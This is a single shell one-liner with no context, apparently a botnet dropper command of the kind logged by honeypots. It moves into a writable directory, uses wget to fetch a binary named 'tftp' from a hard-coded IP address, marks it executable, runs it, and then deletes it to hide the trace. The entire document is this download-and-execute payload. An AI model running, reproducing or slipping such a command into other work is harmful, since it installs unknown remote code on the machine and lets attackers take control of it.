cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://66.172.27.232/tftp; chmod +x tftp; ./tftp; rm -rf tftp
